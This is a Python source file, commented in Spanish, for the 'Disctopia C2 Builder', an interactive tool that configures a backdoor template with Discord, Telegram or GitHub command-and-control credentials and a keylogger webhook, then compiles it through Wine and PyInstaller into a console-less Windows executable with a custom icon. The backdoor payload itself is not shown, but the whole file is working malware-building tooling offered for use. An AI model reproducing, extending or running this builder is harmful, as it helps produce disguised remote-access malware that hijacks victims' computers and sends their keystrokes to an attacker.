#!/usr/bin/env python3
"""
builder.py - Script para construir un backdoor personalizado empaquetado en un archivo ejecutable (.exe)
utilizando PyInstaller vía Wine.

Requiere que la variable de entorno PYINSTALLER_PATH esté definida (o se utiliza un valor por defecto).
Utilícelo en conjunto con setup.sh, que prepara el entorno (por ejemplo, configura Wine y otras dependencias).

Ejemplo de ejecución no interactiva:
    export AUTO_BUILD=1
    python3 builder.py
"""

import os
import sys
import re
import subprocess
import logging
from typing import Dict, List, Optional

from prettytable import PrettyTable
from colorama import init, Fore, Style

# Inicializar Colorama para compatibilidad con terminales
init(autoreset=True)

# --- Configuración Global ---
ICON_FILE = "img/exe_file.ico"
# Se utiliza os.getenv para permitir que setup.sh defina PYINSTALLER_PATH; si no, se usa un valor por defecto.
PYINSTALLER_PATH = os.getenv(
    "PYINSTALLER_PATH",
    "~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe"
)
DIST_DIR = "dist"
LOG_FILE = "builder.log"

# Configurar logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)


# --- Funciones Auxiliares ---
def print_msg(msg: str, msg_type: str = "info") -> None:
    """Imprime mensajes formateados con colores y registra en el log."""
    color_map = {
        "success": Fore.GREEN,
        "error": Fore.RED,
        "info": Fore.BLUE,
        "query": Fore.MAGENTA,
        "warning": Fore.YELLOW
    }
    prefix_map = {
        "success": "[+] ",
        "error": "[!] ",
        "info": "[*] ",
        "query": "[?] ",
        "warning": "[~] "
    }
    color = color_map.get(msg_type, "")
    prefix = prefix_map.get(msg_type, "")
    final_msg = f"{prefix}{msg}"
    print(f"\n{color}{final_msg}{Style.RESET_ALL}")
    logging.info(final_msg)


def clear_screen() -> None:
    """Limpia la pantalla de la terminal."""
    os.system("cls" if os.name == "nt" else "clear")


def detect_distribution() -> str:
    """
    Detecta la distribución del sistema basándose en el archivo /etc/os-release.
    Útil para futuras adaptaciones (por ejemplo, ajustar repositorios).
    """
    if os.path.exists("/etc/os-release"):
        with open("/etc/os-release", "r") as f:
            for line in f:
                if line.startswith("ID="):
                    return line.split("=")[1].strip().strip('"')
    return "unknown"


def create_table(settings: List[str], payload_type: str) -> Optional[PrettyTable]:
    """
    Crea una tabla con la configuración del backdoor.
    
    :param settings: Lista de valores de configuración (obtenida del diccionario de settings).
    :param payload_type: Tipo de payload (discord, telegram, github).
    :return: Tabla PrettyTable o None si el payload no es válido.
    """
    table = PrettyTable(["Configuración", "Valor"])
    table.add_row(["Nombre del Backdoor", settings[0]])

    if payload_type == "discord":
        table.add_row(["ID Servidor", settings[1]])
        table.add_row(["Token Bot", settings[2]])
        table.add_row(["ID Canal", settings[3]])
        table.add_row(["Webhook Keylogger", settings[4]])
    elif payload_type == "telegram":
        table.add_row(["ID Usuario", settings[1]])
        table.add_row(["Token Bot", settings[2]])
    elif payload_type == "github":
        table.add_row(["Token GitHub", settings[1]])
        table.add_row(["Repositorio GitHub", settings[2]])
    else:
        print_msg("Seleccione un Payload correcto.", "error")
        return None
    return table


def replace_placeholders(file_path: str, replacements: Dict[str, str]) -> Optional[str]:
    """
    Reemplaza los placeholders en un archivo por los valores proporcionados.
    Se asume que los marcadores tienen el formato '{PLACEHOLDER}'.

    :param file_path: Ruta del archivo fuente.
    :param replacements: Diccionario de reemplazos.
    :return: Contenido modificado o None en caso de error.
    """
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()

        for placeholder, value in replacements.items():
            if placeholder not in content:
                print_msg(f"Placeholder no encontrado: {placeholder}", "warning")
            content = content.replace(placeholder, str(value))
        return content
    except FileNotFoundError:
        print_msg(f"Error: Archivo no encontrado: {file_path}", "error")
        return None
    except Exception as e:
        print_msg(f"Error al reemplazar marcadores: {e}", "error")
        return None


def build_backdoor(backdoor_name: str, payload: str, data_list: List[str],
                     pyinstaller_path: str) -> bool:
    """
    Construye el backdoor utilizando PyInstaller a través de Wine.

    :param backdoor_name: Nombre del backdoor.
    :param payload: Tipo de payload (discord, telegram, github).
    :param data_list: Lista de configuraciones.
    :param pyinstaller_path: Ruta a PyInstaller (dentro de Wine).
    :return: True si la construcción fue exitosa, False en caso contrario.
    """
    print_msg("Construyendo el backdoor...", "success")
    try:
        source_file = ""
        replacements: Dict[str, str] = {}

        if payload == "discord":
            source_file = "code/discord/main.py"
            replacements = {
                "{GUILD}": str(data_list[1]),
                "{TOKEN}": str(data_list[2]),
                "{CHANNEL}": str(data_list[3]),
                "{KEYLOG_WEBHOOK}": str(data_list[4]),
            }
        elif payload == "telegram":
            source_file = "code/telegram/main.py"
            replacements = {
                "{BOT_TOKEN}": str(data_list[2]),
                "{USER_ID}": str(data_list[1]),
            }
        elif payload == "github":
            source_file = "code/github/main.py"
            replacements = {
                "{TOKEN}": str(data_list[1]),
                "{REPO}": str(data_list[2]),
            }
        else:
            print_msg("Payload no reconocido.", "error")
            return False

        new_code = replace_placeholders(source_file, replacements)
        if new_code is None:
            return False

        temp_file = f"{backdoor_name}.py"
        with open(temp_file, 'w', encoding='utf-8') as f:
            f.write(new_code)

        compile_command = [
            "wine",
            pyinstaller_path,
            "--onefile",
            "--noconsole",
            f"--icon={ICON_FILE}",
            temp_file,
        ]
        subprocess.run(compile_command, check=True)

        os.remove(temp_file)
        spec_file = f"{backdoor_name}.spec"
        if os.path.exists(spec_file):
            os.remove(spec_file)

        print_msg(f"El Backdoor se encuentra en el directorio: \"{DIST_DIR}\"", "success")
        return True
    except FileNotFoundError:
        print_msg(f"PyInstaller no encontrado en: {pyinstaller_path}. Compruebe la ruta.", "error")
        return False
    except subprocess.CalledProcessError as e:
        print_msg(f"Error durante la compilación (PyInstaller): {e}", "error")
        return False
    except Exception as e:
        print_msg(f"Error durante la compilación: {e}", "error")
        return False


# --- Validación de Entradas ---
def validate_token(token: str) -> bool:
    """
    Valida el formato de un token (por ejemplo, Discord o similar).
    Se usa una expresión regular simplificada; puede ajustarse según sea necesario.
    """
    # Ejemplo de token: 24 caracteres, un punto, 6 caracteres, un punto, 27 caracteres
    pattern = r'^[\w-]{24}\.[\w-]{6}\.[\w-]{27}$'
    return re.fullmatch(pattern, token) is not None


def validate_url(url: str) -> bool:
    """Valida que una URL comience con https://."""
    return url.startswith("https://")


# --- Interfaz de Usuario ---
class CommandInterface:
    def __init__(self) -> None:
        self.settings: Dict[str, str] = {
            "name": "",
            "guild_id": "",
            "bot_token": "",
            "channel_id": "",
            "webhook": "",
            "user_id": "",
            "github_token": "",
            "github_repo": "",
            "payload_type": ""
        }
        # Expandir la ruta de PyInstaller
        self.pyinstaller_path: str = os.path.expanduser(PYINSTALLER_PATH)

    def handle_command(self, command: str) -> None:
        """Procesa la entrada de comandos del usuario."""
        command_list = command.split()
        if not command_list:
            return

        cmd = command_list[0].lower()

        if cmd == "exit":
            print_msg("Saliendo!", "success")
            sys.exit(0)

        elif cmd == "use":
            if len(command_list) < 2:
                print_msg("Especifique un payload!", "error")
                return
            selected_payload = command_list[1].lower()
            if selected_payload in ("discord", "telegram", "github"):
                self.settings["payload_type"] = selected_payload
                print_msg(f"Utilizando {selected_payload.capitalize()} C2", "success")
            else:
                print_msg("Payload no válido!", "error")
                return

            table = create_table(list(self.settings.values()), selected_payload)
            if table:
                print_msg(table.get_string(title='Disctopia Backdoor Settings'), "info")
                print_msg("Ejecute 'help set' para más información.", "info")

        elif cmd == "set":
            if len(command_list) < 3:
                print_msg("¡Por favor, especifique una configuración!", "error")
                return
            setting = command_list[1].lower()
            value = command_list[2]
            if not self.validate_setting(setting, value):
                return
            self.settings[setting] = value
            print_msg(f"Configuración '{setting}' establecida a '{value}'", "success")

        elif cmd == "config":
            table = create_table(list(self.settings.values()), self.settings["payload_type"])
            if table:
                print_msg(table.get_string(title='Disctopia Backdoor Settings'), "info")

        elif cmd == "clear":
            clear_screen()

        elif cmd == "help":
            self.show_help(command_list)

        elif cmd == "build":
            if not self.settings["name"]:
                print_msg("Por favor, establezca un nombre de Backdoor usando 'set name <name>'", "error")
                return
            # Se utiliza un valor predeterminado en la confirmación (por defecto, 'n')
            confirmation = input("¿Está seguro de que desea construir el BackDoor? (s/N): ").strip().lower() or "n"
            if confirmation == "s":
                build_backdoor(
                    self.settings["name"],
                    self.settings["payload_type"],
                    list(self.settings.values()),
                    self.pyinstaller_path
                )
            else:
                print_msg("Construcción cancelada.", "info")

        else:
            print_msg("Comando inválido.", "error")

    def validate_setting(self, key: str, value: str) -> bool:
        """
        Valida los valores de configuración con reglas predefinidas.
        Se han añadido validaciones extra para tokens y URLs.
        """
        validation_rules: Dict[str, tuple] = {
            "name": (lambda v: 3 <= len(v) <= 50, "El nombre debe tener entre 3 y 50 caracteres."),
            "bot_token": (lambda v: len(v) >= 20 and validate_token(v),
                          "El token debe ser válido y tener al menos 20 caracteres en formato correcto."),
            "guild_id": (lambda v: v.isdigit(), "El ID del servidor debe ser numérico."),
            "user_id": (lambda v: v.isdigit(), "El ID del usuario debe ser numérico."),
            "github_token": (lambda v: len(v) > 0, "El token de GitHub no puede estar vacío."),
            "github_repo": (lambda v: len(v) > 0, "El repositorio de GitHub no puede estar vacío."),
            "channel_id": (lambda v: v.isdigit(), "El ID del canal debe ser numérico."),
            "webhook": (lambda v: validate_url(v), "El webhook debe ser una URL válida que comience con 'https://'."),
        }
        if key in validation_rules:
            validator, message = validation_rules[key]
            if not validator(value):
                print_msg(f"Error de validación: {message}", "error")
                return False
        return True

    def show_help(self, command_list: List[str]) -> None:
        """Muestra la ayuda para los comandos disponibles."""
        if len(command_list) == 1:
            print(
                """
Help Menu:

  help <command>         Muestra ayuda para un comando específico.
  use <payload>          Selecciona el payload a utilizar (discord, telegram, github).
  set <setting> <value>    Establece el valor para una configuración.
  config                 Muestra la configuración actual.
  build                  Empaqueta el backdoor en un archivo ejecutable (.exe).
  clear                  Limpia la pantalla.
  exit                   Sale del constructor.
                """
            )
        elif len(command_list) == 2:
            command_help = command_list[1].lower()
            if command_help == "use":
                print_msg("Uso: use <payload>\nSelecciona el payload (discord, telegram, github).", "info")
            elif command_help == "set":
                print_msg("Uso: set <setting> <value>\nEstablece el valor para una configuración.", "info")
            elif command_help == "config":
                print_msg("Uso: config\nMuestra la configuración actual.", "info")
            elif command_help == "build":
                print_msg("Uso: build\nEmpaqueta el backdoor en un archivo ejecutable (.exe).", "info")
            elif command_help == "update":
                print_msg("update (deshabilitado) - Obtiene la última versión del constructor.", "info")
            else:
                print_msg(f"Comando de ayuda desconocido: {command_help}", "error")
        else:
            print_msg("Formato de comando de ayuda no válido.", "error")


# --- Ejecución Principal ---
def main() -> None:
    clear_screen()
    print_msg("Disctopia C2 Builder", "info")
    distro = detect_distribution()
    print_msg(f"Distribución detectada: {distro}", "info")

    interface = CommandInterface()

    try:
        while True:
            prompt = f"\n[{interface.settings['payload_type'] or 'none'}] > "
            command = input(prompt).strip()
            if not command:
                continue
            interface.handle_command(command)
    except KeyboardInterrupt:
        print_msg("\nOperación cancelada por el usuario", "warning")
        sys.exit(1)
    except Exception as e:
        print_msg(f"Error crítico: {e}", "error")
        logging.critical(f"Error en main: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
